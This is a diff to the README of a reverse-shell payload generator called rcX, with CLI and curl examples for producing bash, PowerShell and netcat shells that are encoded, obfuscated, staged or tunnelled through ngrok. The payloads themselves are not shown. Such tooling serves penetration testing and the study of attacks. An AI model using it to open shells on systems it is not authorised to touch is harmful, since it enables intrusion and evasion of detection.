@@ -15,8 +15,10 @@
 
 ## Follow me
 ### CLI Usage
+#### Example:
 ##### 1.Get a bash reverse shell and output in tabular format.
 `python rcX.py -l 127.0.0.1 -p 8888 -t bash --table`
+![rcX](rcX-png/rcx-table.png "rcX")
 ##### 2.Custom shell path.
 `python rcX.py -l 127.0.0.1 -p 8888 -t bash -s "/bin/sh"`
 ##### 3.Copy the specified id payload to the clipboard.
@@ -24,10 +26,11 @@
 ##### 4.Get a base64 encoded bash reverse shell.
 `python rcX.py -l 127.0.0.1 -p 8888 -t bash -e base64`
 ##### 5.Get a xor encoded and obfuscated bash reverse shell.
-`python rcX.py -l 127.0.0.1 -p 8888 -t b#### Examle:
-ash -e base64 --obf reverse`
+`python rcX.py -l 127.0.0.1 -p 8888 -t bash -e xor --obf reverse --clip 7`
+![rcX](rcX-png/rcx-obf.png "rcX")
 ##### 6.Get a staging bash reverse shell.
 `python rcX.py -l 127.0.0.1 -p 8888 -t bash --staging-url 0 --staging-cmd 0`
+![rcX](rcX-png/rcx-staged.png "rcX")
 ##### 7.Get a staging bash reverse shell and forward local port using ngrok tunnel.
 `python rcX.py -l 127.0.0.1 -p 8888 -t bash --tunnel ngrok_jp`
 ##### 8.Get a Windows Powershell reverse shell.
@@ -38,9 +41,9 @@ ash -e base64 --obf reverse`
 > At the same time, rcX also provides a web interface. 
 Use rcX as a server then you can use it with your team or friends.
 > Tip: When rcX is running as a server, if the request origin is not 127.0.0.1 or localhost, the ngrok tunnel feature will be disabled and the related options will be hidden on the Front-end
-#### Examle:
+#### Example:
 `python rcX.py -w`
-![rcX](rcX-png/rcx-web.gif) "rcX")
+![rcX](rcX-png/rcx-web.gif "rcX")
 
 ### Web CLI
 > When rcX is running as a server, you can use curl in terminal to get the payload.
@@ -62,13 +65,13 @@ Use rcX as a server then you can use it with your team or friends.
 ##### 5.xor encoded and reverse(obfuscation method)
   `curl http://127.0.0.1/linux/bash/127.0.0.4/8888/xor/reverse`
 
-##### 6.Get a windows powershell reverse shell payload
+##### 6.Get a Windows powershell reverse shell payload
   `curl http://127.0.0.1/windows/powershell/127.0.0.4/44444`
 
 ##### 6.replace_char(obfuscation method) only without using encoder
   `curl http://127.0.0.1/windows/powershell/127.0.0.4/44444/,/replace_char`
 
-##### 7.Only use stagers, without any encoder and obfuscator
+##### 7.Only use staging, without any encoder and obfuscator
   `curl http://127.0.0.1/linux/bash/127.0.0.4/8888/,/,/1/1`
 
 ##### 8.Get a bind linux netcat shell payload
